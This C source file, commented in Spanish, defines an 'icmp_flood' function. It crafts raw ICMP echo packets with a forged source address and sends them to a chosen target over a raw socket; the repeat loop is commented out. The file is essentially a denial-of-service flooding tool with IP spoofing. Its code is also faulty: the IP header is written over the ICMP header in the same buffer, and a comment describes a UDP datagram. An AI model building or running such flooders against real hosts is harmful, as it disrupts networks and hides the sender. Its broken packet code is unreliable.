#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/tcp.h>	//tcp header
#include <netinet/udp.h>	// udp header
#include <netinet/ip.h>	// ip_header
#include <netinet/ip_icmp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "./includes/checksum.h"
#include "./includes/udp.h"
#include "./includes/tcp.h"
#include "./includes/icmp.h"

#define DATAGRAM_LEN 4096
#define IP4_HDRLEN 20         // IPv4 header length
#define ICMP_HDRLEN 8         // ICMP header length for echo request

// Funcion que crea un datagrama UDP con la direccion de origen, destino y payload proporcionos
void icmp_flood(int sock, char* src, char* dst, int puerto){
    //while(1){
        // direccion IP de destino
        struct sockaddr_in daddr;
        if(host_addr(&daddr, dst, puerto) == 1){
            perror("Error al crear la configuracion IP");
            exit(1);
        }

        // direccion IP de origen
        struct sockaddr_in saddr;
        if(host_addr(&saddr, src, (rand() % 6000)) == 1){
            perror("Error al crear la configuracion IP");
            exit(1);
        }

        char *datagram = calloc(DATAGRAM_LEN, sizeof(char));

        struct icmphdr *icmph = (struct icmphdr *) datagram;

        icmph->type = ICMP_ECHO;         // ICMP echo request type
        icmph->code = 0;                 // ICMP echo request code
        icmph->un.echo.id = htons(1234); // Identifier
        icmph->un.echo.sequence = htons(1); // Sequence number
        icmph->checksum = 0;
        icmph->checksum = checksum((unsigned short*)icmph, sizeof(struct icmphdr));

        //IP header
        struct iphdr *iph = (struct iphdr *) datagram;
        
        // IP header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = IP4_HDRLEN + ICMP_HDRLEN;
        iph->id = htonl(rand() % 78123);
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = IPPROTO_ICMP;
        iph->check = 0;
        iph->saddr = saddr.sin_addr.s_addr;
        iph->daddr = daddr.sin_addr.s_addr;
        
        //Ip checksum
        iph->check = csum ((unsigned short *) datagram, iph->tot_len);
        if(sendto(sock, datagram, iph->tot_len, 0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
        {
            perror("No se ha podido enviar el datagrama");
        } else {
            printf ("Datagrama enviado. Tamaño : %d \n" , iph->tot_len);
        }
    //}
}